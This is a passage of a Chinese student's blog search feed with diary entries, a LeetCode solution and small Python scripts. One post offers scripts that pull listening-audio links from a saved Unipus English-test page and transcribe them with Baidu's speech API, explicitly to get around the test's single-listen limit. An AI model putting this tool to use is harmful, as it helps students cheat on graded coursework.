<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【置顶】README</title>
      <link href="/blog/TODOLIST/"/>
      <url>/blog/TODOLIST/</url>
      
        <content type="html"><![CDATA[<ul><li><p>20200430<br>daily不会被爬去咯，省的我的言论留下快照hhh，不然可以直接删库跑路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">path = <span class="string">"_posts/"</span></span><br><span class="line">dirs = os.listdir(path)</span><br><span class="line"></span><br><span class="line">patten = <span class="string">"20*"</span></span><br><span class="line"></span><br><span class="line">rbt = open(<span class="string">'robot.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">print(<span class="string">"User-agent: *"</span>, file=rbt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> dirs:</span><br><span class="line">    <span class="comment"># print(file)</span></span><br><span class="line">    <span class="keyword">if</span> re.match(patten, file):</span><br><span class="line">        print(file)</span><br><span class="line">        filename = file.split(<span class="string">'.'</span>)[<span class="number">0</span>]</span><br><span class="line">        print(filename)</span><br><span class="line">        print(<span class="string">'Disallow:/blog/&#123;&#125;/*'</span>.format(filename), file=rbt)</span><br></pre></td></tr></table></figure></li><li><p>20200415<br>与其说这是TODOLIST，不如说这是README。</p></li></ul><p>这是一篇发自现在功在将来的TODOLIST。<br>哈哈哈<br>不知道该写啥</p><ul><li><p>20191121<br>我在首页加了点代码，日常啥的不会在首页显示了0.0，<del>看起来更像技术博客了233</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block content %&#125;</span><br><span class="line">  &lt;section id="posts" class="posts-expand"&gt;</span><br><span class="line">    &#123;% <span class="keyword">for</span> post <span class="keyword">in</span> page.posts %&#125;</span><br><span class="line">      &#123;% <span class="keyword">if</span> post.hide != true %&#125;</span><br><span class="line">        &#123;&#123; post_template.render(post, true) &#125;&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">  &lt;/section&gt;</span><br><span class="line"></span><br><span class="line">  &#123;% include <span class="string">'_partials/pagination.swig'</span> %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li><li><p>20190907<br>我把所有文章的地址中的日期全去掉了，所以评论全木有了QAQ，之前被收录的链接应该也失效了，这次应该不会再换地址了8</p></li></ul><p><del>每篇文章底下的gitment可以评论，但是我没设置自动初始化，所以…可以在这里留言…(如果你能看到这句话的话…</del><br>太麻烦了，现在gitment貌似挂了，有啥问题直接发issue或者QQ729320011<br><del>想换成gitalk也失败了…不搞了…随缘吧</del><br>gitalk好像好了qwq，大噶在文章下方评论试下吧</p>]]></content>
      
      
      <categories>
          
          <category> TODOLIST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TODOLIST </tag>
            
            <tag> README </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200525</title>
      <link href="/blog/20200525/"/>
      <url>/blog/20200525/</url>
      
        <content type="html"><![CDATA[<p>最近几天，做了一个数学建模题，用Python做的…慢的是真的离谱，$10^8$的复杂度居然能跑10min…<br>希望我模拟退火和遗传算法没写错…</p><p>还有就是我要注意Python的模块化了 - -，一个文件1k行代码，我真的人都傻了</p><p>继续赶ddl</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200510</title>
      <link href="/blog/20200510/"/>
      <url>/blog/20200510/</url>
      
        <content type="html"><![CDATA[<p>嗝，不学习还是挺爽的hhh<br>感觉总是计划赶不上变化- -，我真的需要好好休息，不能再熬夜了，有些影响精神状态</p><p>还有就是吐槽一下那个知乎的严选文章，nmd看一半给爷卡住了要付费???<br>这是真的恶心人嗷，出个选项让我看不到这种文章不行吗，jnmlp</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode Hard</title>
      <link href="/blog/problem-leetcode-hard/"/>
      <url>/blog/problem-leetcode-hard/</url>
      
        <content type="html"><![CDATA[<p>除了搞CTF的，大概只有很少人知道leetcode是一种编码吧 - -。<br>只做hard<br><del>提高一下Python编程能力</del>（我是sb才会用Python做算法题，太艹了）<br>还有让我秀逗的脑袋思考一下 - -。<br>——20200509</p><hr><h2 id="LCP-14-切分数组"><a href="#LCP-14-切分数组" class="headerlink" title="LCP 14. 切分数组"></a>LCP 14. 切分数组</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p><a href="https://leetcode-cn.com/problems/qie-fen-shu-zu/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/qie-fen-shu-zu/</a><br>切分一个数组，切分条件是两端的数不互质，问最少切分组数 $N\leqslant 10^5, nums[i]\leqslant 10^6$</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>标准$O(n\log n)$复杂度的数据范围…从数据范围猜复杂度233<br>首先$O(n^2\log n)$的最暴力的做法很直观吧..<br>反正是肯定要分解质因数，最初我的想法是分解完了，建图- -，有相同因数的索引两两连边cost为0，相邻的连边cost为1，从1到n跑最短路就得到了，复杂度是$O(n\log n+n^2+n^2)$…<br>然后dp优化就是，对于每个质数维护一个堆，表示以这个质数开头的最小cost，复杂度就是$O(n\log^2 n)$<br>嗯，我们不用堆，就是$O(n\log n)$了…单调下降的..<br>还是说一下具体的方法吧，就是线性筛+DP，线性筛求出每个数的最小质数，听说有人被卡常了??? 这不是$O(10^6)$的吗…<br>维护两个数组$f[i]$表示以$i$结尾的最小cost，$g[i]$表示以质因数$i$开头的最小cost<br>对于每个位置$i$，首先分解$nums[i]$，然后维护$g[minp]=min\{g[minp], f[i-1]+1\}$，也就是以当前数字开头的更新；$f[i]=min\{f[i],g[minp]\}$，结尾自然和开头对应，不需要加cost。最后直接返回$f[n]$就ok</p><p>ps. 内存击败了100%的用户可还行…<br>——20200510</p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span>+<span class="number">50</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">8e4</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">bool</span> b[N];</span><br><span class="line">    <span class="keyword">int</span> p[N], cntp;</span><br><span class="line">    <span class="keyword">int</span> minp[N], minc[N];</span><br><span class="line">    <span class="keyword">int</span> f[N], g[M];</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;N; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!b[i]) p[++cntp]=i, minp[i]=cntp;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=cntp &amp;&amp; p[j]*i&lt;N; j++) &#123;</span><br><span class="line">                b[i*p[j]] = <span class="number">1</span>; minp[i*p[j]] = j;</span><br><span class="line">                <span class="keyword">if</span>(i%p[j]==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">splitArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// for(int i=0; i&lt;nums.size(); i++) cout &lt;&lt; nums[i] &lt;&lt; " ";cout &lt;&lt; endl;</span></span><br><span class="line">        n = nums.size();</span><br><span class="line">        init();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;M; i++) g[i]=n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> x = nums[i<span class="number">-1</span>]; f[i]=n;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; x &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">while</span>(x&gt;<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> xminp = minp[x];</span><br><span class="line">                g[xminp]=min(g[xminp], f[i<span class="number">-1</span>]);</span><br><span class="line">                f[i]=min(f[i], g[xminp]+<span class="number">1</span>);</span><br><span class="line">                x/=p[xminp];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> problem </category>
          
      </categories>
      
      
        <tags>
            
            <tag> problem </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200506</title>
      <link href="/blog/20200506/"/>
      <url>/blog/20200506/</url>
      
        <content type="html"><![CDATA[<p>TODO</p><ul><li>Improve English expression skills.</li><li>Machine Learning</li><li>Pytorch</li><li>Computer Network</li></ul>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>f**k unipus</title>
      <link href="/blog/misc-fuck-unipus/"/>
      <url>/blog/misc-fuck-unipus/</url>
      
        <content type="html"><![CDATA[<h2 id="Version-1-1"><a href="#Version-1-1" class="headerlink" title="Version 1.1"></a>Version 1.1</h2><h3 id="README"><a href="#README" class="headerlink" title="README"></a>README</h3><p>忽然想起百度有语音识别的api，果断就用了<br>这次有依赖<a href="http://ffmpeg.org/" target="_blank" rel="noopener">ffmpeg</a><br><code>APIKey</code>和<code>SecretKey</code>自己去百度大脑申请一个语音识别的应用就可以了<a href="http://ai.baidu.com/" target="_blank" rel="noopener">http://ai.baidu.com/</a><br>效果的话…还ok.百度的识别是不带标点的，也就是要自己断句咯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">don&apos;t worry madam I&apos;ll get you there in time it looks as if most people </span><br><span class="line">have already gone home today I hope so the plane leaves at seven I don&apos;t </span><br><span class="line">want to arrive in London too late or the hotel will think I&apos;m not coming </span><br><span class="line">and I might lose my room question where is the man taking the woman to</span><br></pre></td></tr></table></figure></p><p>目前存在的不足：</p><ul><li>过长的文件无法翻译(这个我将会在下面的版本修复^^，待我了解一下音频格式再说)</li></ul><p>——20200430</p><h3 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re, requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">"https://openapi.baidu.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=%s&amp;client_secret=%s"</span></span><br><span class="line">APIKey = <span class="string">"***"</span></span><br><span class="line">SecretKey = <span class="string">"***"</span> </span><br><span class="line"></span><br><span class="line">HOST = base_url % (APIKey, SecretKey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(host)</span>:</span></span><br><span class="line">    res = requests.post(host)</span><br><span class="line">    <span class="keyword">return</span> res.json()[<span class="string">'access_token'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_audio</span><span class="params">(file)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">speech2text</span><span class="params">(FILEPATH, dev_pid=<span class="number">1737</span>)</span>:</span></span><br><span class="line">    token = getToken(HOST)</span><br><span class="line">    speech_data = get_audio(FILEPATH)</span><br><span class="line"></span><br><span class="line">    FORMAT = <span class="string">'wav'</span></span><br><span class="line">    RATE = <span class="string">'16000'</span></span><br><span class="line">    CHANNEL = <span class="number">1</span></span><br><span class="line">    CUID = <span class="string">'*******'</span></span><br><span class="line">    SPEECH = base64.b64encode(speech_data).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'format'</span>: FORMAT,</span><br><span class="line">        <span class="string">'rate'</span>: RATE,</span><br><span class="line">        <span class="string">'channel'</span>: CHANNEL,</span><br><span class="line">        <span class="string">'cuid'</span>: CUID,</span><br><span class="line">        <span class="string">'len'</span>: len(speech_data),</span><br><span class="line">        <span class="string">'speech'</span>: SPEECH,</span><br><span class="line">        <span class="string">'token'</span>: token,</span><br><span class="line">        <span class="string">'dev_pid'</span>:dev_pid</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">'https://vop.baidu.com/server_api'</span></span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">    <span class="comment"># r=requests.post(url,data=json.dumps(data),headers=headers)</span></span><br><span class="line">    </span><br><span class="line">    r = requests.post(url, json=data, headers=headers)</span><br><span class="line">    Result = r.json()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'result'</span> <span class="keyword">in</span> Result:</span><br><span class="line">        <span class="keyword">return</span> Result[<span class="string">'result'</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"index.html"</span></span><br><span class="line">    url_voice2text = <span class="string">"https://app.xunjiepdf.com/voice2text/"</span></span><br><span class="line">    url_translate = <span class="string">"https://translate.google.cn/"</span></span><br><span class="line">    soup = BeautifulSoup(open(url, encoding=<span class="string">'utf-8'</span>))</span><br><span class="line">    allres = soup.find_all(name=<span class="string">'div'</span>,attrs=&#123;<span class="string">"class"</span>:<span class="string">"itest-hear-reslist"</span>&#125;)</span><br><span class="line">    <span class="comment"># print(soup)</span></span><br><span class="line">    counter = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> allres:</span><br><span class="line">        st = res.span.text;</span><br><span class="line">        st = str(st)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">        st = st.split(<span class="string">','</span>)</span><br><span class="line">        <span class="keyword">for</span> est <span class="keyword">in</span> st:</span><br><span class="line">            <span class="keyword">if</span>(re.match(<span class="string">r'.*\.mp3.*'</span>, est)):</span><br><span class="line">                <span class="keyword">if</span>(re.match(<span class="string">r'.*question\.mp3+.*'</span>, est)):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                print(est[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">                download_addr = est[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">                print(<span class="string">'Downloading...'</span>)</span><br><span class="line">                f=requests.get(download_addr)</span><br><span class="line">                <span class="keyword">with</span> open(str(counter)+<span class="string">".mp3"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">                    code.write(f.content)</span><br><span class="line">                print(<span class="string">'Downloaded'</span>)</span><br><span class="line">                print(<span class="string">'Transcoding mp3 to pcm...'</span>)</span><br><span class="line">                os.system(<span class="string">"ffmpeg -y -i "</span> + str(counter) + <span class="string">".mp3 -acodec pcm_s16le -f s16le -ac 1 -ar 16000 "</span>  + str(counter) + <span class="string">".pcm"</span> )</span><br><span class="line">                print(<span class="string">'Transcoded mp3 to pcm'</span>)</span><br><span class="line">                print(<span class="string">'Recognizing...'</span>)</span><br><span class="line">                result = speech2text(FILEPATH=str(counter)+<span class="string">".pcm"</span>)</span><br><span class="line">                print(<span class="string">'-'</span>*<span class="number">48</span>)</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">with</span> open(str(counter)+<span class="string">".txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> ff:</span><br><span class="line">                    print(result, file=ff)</span><br><span class="line">                print(<span class="string">'-'</span>*<span class="number">48</span>)</span><br><span class="line">                print(<span class="string">'Recognized'</span>)</span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line">                print(<span class="string">'Finished'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(i.span.text)</span></span><br><span class="line">    <span class="comment"># print(allres)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h3><ul><li>ffmpeg官方文档, <a href="http://ffmpeg.org/ffmpeg.html" target="_blank" rel="noopener">http://ffmpeg.org/ffmpeg.html</a></li><li>百度语音识别api文档, <a href="https://ai.baidu.com/ai-doc/SPEECH/Vk38lxily" target="_blank" rel="noopener">https://ai.baidu.com/ai-doc/SPEECH/Vk38lxily</a></li><li>百度语音识别api代码示例, <a href="https://github.com/Baidu-AIP/speech-demo" target="_blank" rel="noopener">https://github.com/Baidu-AIP/speech-demo</a></li><li>python做音频格式转换, <a href="https://blog.csdn.net/pj_developer/article/details/72778792" target="_blank" rel="noopener">https://blog.csdn.net/pj_developer/article/details/72778792</a></li></ul><hr><h2 id="Version-1-0"><a href="#Version-1-0" class="headerlink" title="Version 1.0"></a>Version 1.0</h2><h3 id="README-1"><a href="#README-1" class="headerlink" title="README"></a>README</h3><p>我们英语老师布置的题也太j8多了，70多道题，20多道听力，我都听吐了<br>U校园单元测试还不能查题<br>而且U校园只能听一次听力，然后偶然按了一下F12发现了听力链接就在html里，我人晕了<br>打开链接就能下，但是太j8多了，看得我眼花，就写了这个脚本<br>本来想一键式直接出中文的，但是实力有限，有空再做吧…语音识别和翻译的网页就是里面的几个url<br>因为不会模拟登陆，所以还是请把测试网页Ctrl+S保存成<code>index.html</code>，运行这个脚本就会出现很多听力原文<br>以后如果有时间必会更新<br>——20200403</p><h3 id="CODE-1"><a href="#CODE-1" class="headerlink" title="CODE"></a>CODE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re, requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"index.html"</span></span><br><span class="line">    url_voice2text = <span class="string">"https://app.xunjiepdf.com/voice2text/"</span></span><br><span class="line">    url_translate = <span class="string">"https://translate.google.cn/"</span></span><br><span class="line">    soup = BeautifulSoup(open(url, encoding=<span class="string">'utf-8'</span>))</span><br><span class="line">    allres = soup.find_all(name=<span class="string">'div'</span>,attrs=&#123;<span class="string">"class"</span>:<span class="string">"itest-hear-reslist"</span>&#125;)</span><br><span class="line">    <span class="comment"># print(soup)</span></span><br><span class="line">    counter = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> allres:</span><br><span class="line">        st = res.span.text;</span><br><span class="line">        st = str(st)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">        st = st.split(<span class="string">','</span>)</span><br><span class="line">        <span class="keyword">for</span> est <span class="keyword">in</span> st:</span><br><span class="line">            <span class="keyword">if</span>(re.match(<span class="string">r'.*\.mp3.*'</span>, est)):</span><br><span class="line">                <span class="keyword">if</span>(re.match(<span class="string">r'.*question\.mp3+.*'</span>, est)):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                print(est[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">                download_addr = est[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">                print(<span class="string">'downloading...'</span>)</span><br><span class="line">                f=requests.get(download_addr)</span><br><span class="line">                <span class="keyword">with</span> open(str(counter)+<span class="string">".mp3"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">                    code.write(f.content)</span><br><span class="line">                counter += <span class="number">1</span></span><br><span class="line">                print(<span class="string">'downloaded'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(i.span.text)</span></span><br><span class="line">    <span class="comment"># print(allres)</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> unipus </tag>
            
            <tag> html </tag>
            
            <tag> bs4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200430</title>
      <link href="/blog/20200430/"/>
      <url>/blog/20200430/</url>
      
        <content type="html"><![CDATA[<p>昨天海南大学也上了热搜…开学和王小妮的事撞一起了，连环发酵…<br>反正早知道wb有多nt，还是忍不住喷几句</p><p>挖坟这种事情已经不知道出现多少次了，但是毕竟在公共社交平台占用公共资源，无论是自己现在还是过去都应该对自己的言论负责吧<br>说不定以后这种事也会落到我头上hhh，毕竟脑热就开始瞎说</p><p>至于开学的阴谋论…估计也就只有nt能说出来了</p><p>终于暂时告别了一下被ddl赶着走的日子<br>也不指望论文能有什么太好的成果，自己都觉得shui…能不能被accept就随缘吧…<br>不管怎么说…自己代码能力确实提升了点…Pytorch真的好用 - -<br>Anyway，要开学了，该还的也该还了，要补作业了，要好好学了，也要见自己女朋友了</p><p>好好做人</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200424</title>
      <link href="/blog/20200424/"/>
      <url>/blog/20200424/</url>
      
        <content type="html"><![CDATA[<p>好讨厌被催促的感觉…还有时间迫近的感觉</p><p>英语老师还有外教也是真是神人了嗷 一个周末晚上9.30考试的，一个凌晨截止交作业的，是真的np</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200412</title>
      <link href="/blog/20200412/"/>
      <url>/blog/20200412/</url>
      
        <content type="html"><![CDATA[<p>我发现我数据处理的代码能力实在是太差了<br>还有建模的代码能力</p><p>我觉得有必要多写些模型了</p><p>就几维数据，我能处理半年，我真的是吐了</p><p>还有就是日期的处理，我真的人晕了</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200410</title>
      <link href="/blog/20200410/"/>
      <url>/blog/20200410/</url>
      
        <content type="html"><![CDATA[<p>最近玩MITE上瘾，一玩就是好几个小时，停都停不下来<br>dbq以后一定好好做人</p><p>今早7.40计算机网络，我7.30起了，接着睡下了我擦，还没进直播间，硬生生旷了一节课<br>记一下第一次旷的课…还是网课…</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的世界自动备份脚本</title>
      <link href="/blog/misc-minecraft-backup/"/>
      <url>/blog/misc-minecraft-backup/</url>
      
